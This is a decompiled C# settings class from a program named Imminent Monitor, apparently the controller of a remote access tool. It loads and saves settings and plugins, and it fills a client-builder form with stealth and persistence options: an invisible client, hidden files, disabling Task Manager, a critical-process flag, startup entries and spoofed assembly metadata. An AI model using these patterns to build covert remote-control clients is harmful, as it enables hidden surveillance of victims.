// Decompiled with JetBrains decompiler
// Type: Class148
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using ImminentMonitor.Cef;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Windows.Forms;

[StandardModule]
internal sealed class Class148
{
  private static readonly string string_0 = Application.StartupPath + "\\Settings\\User\\GeneralSettings.dat";
  private static readonly string string_1 = Application.StartupPath + "\\Settings\\User\\GeneralSettings.xml";
  private static readonly string string_2 = Application.StartupPath + "\\Settings\\User\\";

  public static void smethod_0(string string_3)
  {
    ProfileSettings profileSettings = GClass26.smethod_1(string_3);
    FormMain formMain0 = Class97.formMain_0;
    string string_4 = string.Format("$('#CompanyName').val('{0}');$('#ContactEmail').val('{1}');$('#CheckBoxInvisible').prop('checked', {2});$('#IP').val('{3}');$('#Port').val('{4}');$('#Group').val('{5}');$('#CheckBoxIntegration').prop('checked', {6});$('#CheckBoxHideFile').prop('checked', {7});$('#CheckBoxStartupWatcher').prop('checked', {8});$('#CheckBoxDisableTaskManager').prop('checked', {9});$('#CheckBoxProcessSecurity').prop('checked', {10});$('#CheckBoxProcessCritical').prop('checked', {11});$('#CheckBoxProcessWatcher').prop('checked', {12});$('#CheckBoxStartupEnable').prop('checked', {13});$('#StartupEntry').val('{14}');$('#StartupFolder').val('{15}');$('#StartUpFile').val('{16}');$('#AssemblyTitle').val('{17}');$('#AssemblyDescription').val('{18}');$('#AssemblyCompany').val('{19}');$('#AssemblyProduct').val('{20}');$('#AssemblyCopyright').val('{21}');$('#AssemblyVersion').val('{22}');$('#AssemblyIcon').val('{23}');", (object) profileSettings.get_CompanyName(), (object) profileSettings.get_ContactEmail(), (object) profileSettings.get_InvisibleClient().ToString().ToLower(), (object) profileSettings.get_IP(), (object) profileSettings.get_Port(), (object) profileSettings.Group, (object) profileSettings.FileIntegration.ToString().ToLower(), (object) profileSettings.HiddenProperties.ToString().ToLower(), (object) profileSettings.ClientStartupProtector.ToString().ToLower(), (object) profileSettings.DisableTaskManager.ToString().ToLower(), (object) profileSettings.ProcessSecurityFlag.ToString().ToLower(), (object) profileSettings.CriticalProcessFlag.ToString().ToLower(), (object) profileSettings.ProcessWatcher.ToString().ToLower(), (object) profileSettings.EnableStartup.ToString().ToLower(), (object) profileSettings.StartupEntryName, (object) profileSettings.StartupFolderName, (object) profileSettings.StartupFileName, (object) profileSettings.AssemblyTitle, (object) profileSettings.AssemblyDescription, (object) profileSettings.AssemblyCompany, (object) profileSettings.AssemblyProduct, (object) profileSettings.AssemblyCopyright, (object) profileSettings.AssemblyVersion, (object) profileSettings.AssemblyIcon.Replace("\\", "\\\\"));
    Class97.smethod_20(formMain0.vmethod_58(), string_4);
  }

  public static void smethod_1(string string_3, ProfileSettings profileSettings_0)
  {
    if (Directory.Exists(Application.StartupPath + "\\Settings\\Profiles\\"))
      GClass26.smethod_0(string_3, profileSettings_0);
    else
      Directory.CreateDirectory(Application.StartupPath + "\\Settings\\Profiles\\");
  }

  public static void smethod_2()
  {
    try
    {
      Class97.gclass2_0.method_0("[System] Loading User Settings...", Class97.gclass2_0.textStyle_0);
      if (File.Exists(Class148.string_1))
        Class148.smethod_3();
      if (File.Exists(Class148.string_0))
      {
        Class97.generalSettings_0.LoadSettings();
        FormMain formMain0 = Class97.formMain_0;
        Class148.smethod_8(Class97.generalSettings_0.get_Ports());
        if (Class97.generalSettings_0.get_AutoListen())
          formMain0.vmethod_8().method_1();
      }
      Class148.smethod_11();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_3()
  {
    GeneralSettingsLegacy generalSettingsLegacy = GClass7.smethod_1();
    if (generalSettingsLegacy == null)
    {
      Class97.generalSettings_0.SaveSettings();
      File.Delete(Class148.string_1);
    }
    else
    {
      Class97.generalSettings_0.set_Ports(generalSettingsLegacy.get_Ports());
      Class97.generalSettings_0.set_AutoListen(generalSettingsLegacy.get_AutoListen());
      Class97.generalSettings_0.set_SortByCountry(generalSettingsLegacy.get_SortByCountry());
      Class97.generalSettings_0.set_SortById(generalSettingsLegacy.get_SortById());
      Class97.generalSettings_0.set_SortByOperatingSystem(generalSettingsLegacy.SortByOperatingSystem);
      Class97.generalSettings_0.MinTray = generalSettingsLegacy.MinTray;
      Class97.generalSettings_0.CloseTray = generalSettingsLegacy.CloseTray;
      Class97.generalSettings_0.Notification = generalSettingsLegacy.Notification;
      Class97.generalSettings_0.SoundNotification = generalSettingsLegacy.SoundNotification;
      Class97.generalSettings_0.SaveSettings();
      File.Delete(Class148.string_1);
    }
  }

  public static void smethod_4()
  {
    if (!File.Exists(Class148.string_0))
      return;
    FormMain formMain0 = Class97.formMain_0;
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxMinTray.checked = {0}", (object) Class97.generalSettings_0.MinTray.ToString().ToLower()));
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxCloseTray.checked = {0}", (object) Class97.generalSettings_0.CloseTray.ToString().ToLower()));
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxSoundNotification.checked = {0}", (object) Class97.generalSettings_0.SoundNotification.ToString().ToLower()));
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxNotification.checked = {0}", (object) Class97.generalSettings_0.Notification.ToString().ToLower()));
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxAutoListen.checked = {0}", (object) Class97.generalSettings_0.get_AutoListen().ToString().ToLower()));
    Class97.smethod_20(formMain0.vmethod_58(), string.Format("CheckBoxAnonymousErrorReporting.checked = {0}", (object) Class97.generalSettings_0.AnonymousErrorReporting.ToString().ToLower()));
  }

  public static void smethod_5()
  {
    if (!Directory.Exists(Class148.string_2))
    {
      Directory.CreateDirectory(Class148.string_2);
      Class97.generalSettings_0.SaveSettings();
    }
    if (File.Exists(Class97.generalSettings_0.SettingsPath))
      return;
    Class97.generalSettings_0.SaveSettings();
  }

  public static void smethod_6()
  {
    if (Directory.Exists(Class148.string_2))
    {
      Class97.generalSettings_0.SaveSettings();
    }
    else
    {
      Directory.CreateDirectory(Class148.string_2);
      Class97.generalSettings_0.SaveSettings();
    }
  }

  private static ushort[] smethod_7()
  {
    List<ushort> ushortList = new List<ushort>();
    try
    {
      foreach (ListViewItem listViewItem in Class97.formMain_0.vmethod_8().vmethod_18().Items)
        ushortList.Add(Conversions.ToUShort(listViewItem.Text));
    }
    finally
    {
      IEnumerator enumerator;
      if (enumerator is IDisposable)
        (enumerator as IDisposable).Dispose();
    }
    return ushortList.ToArray();
  }

  private static void smethod_8(ushort[] ushort_0)
  {
    foreach (ushort num in ushort_0)
      Class97.formMain_0.vmethod_8().vmethod_18().Items.Add(new ListViewItem()
      {
        Text = Conversions.ToString((uint) num),
        SubItems = {
          "0",
          "Idle..."
        },
        ImageIndex = 0
      });
  }

  private static int smethod_9(int int_0) => (int) Math.Round(TimeSpan.FromSeconds((double) int_0).TotalMilliseconds);

  public static void smethod_10()
  {
    try
    {
      LoadedPlugins loadedPlugins_0 = new LoadedPlugins();
      try
      {
        foreach (GClass43 gclass43 in Class108.list_0)
          loadedPlugins_0.get_Plugins().Add(gclass43.method_2());
      }
      finally
      {
        List<GClass43>.Enumerator enumerator;
        enumerator.Dispose();
      }
      GClass38.smethod_0(loadedPlugins_0);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Exception exception_0 = ex;
      Class97.smethod_0().method_2(exception_0, (string) null);
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_11()
  {
    if (!File.Exists(GClass38.string_0))
      return;
    LoadedPlugins loadedPlugins = GClass38.smethod_1();
    if (loadedPlugins == null)
      return;
    try
    {
      foreach (string Right in loadedPlugins.get_Plugins())
      {
        try
        {
          foreach (GClass43 gclass43_0 in Class108.list_1)
          {
            if (Operators.CompareString(gclass43_0.method_2(), Right, false) == 0)
              Class108.smethod_11(gclass43_0);
          }
        }
        finally
        {
          List<GClass43>.Enumerator enumerator;
          enumerator.Dispose();
        }
      }
    }
    finally
    {
      List<string>.Enumerator enumerator;
      enumerator.Dispose();
    }
  }
}
